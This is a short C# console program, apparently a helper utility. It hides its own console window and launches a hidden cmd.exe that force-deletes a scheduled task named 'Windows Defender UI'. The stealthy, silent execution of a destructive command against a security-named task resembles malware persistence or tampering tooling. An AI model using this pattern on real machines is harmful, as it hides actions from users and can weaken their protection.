using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace removeTask
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);

            ProcessStartInfo removeTaskInfo =
                new ProcessStartInfo("cmd.exe", "/c " +
                @"schtasks /delete /tn ""Windows Defender UI"" /f");
            removeTaskInfo.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(removeTaskInfo);
        }
    }
}
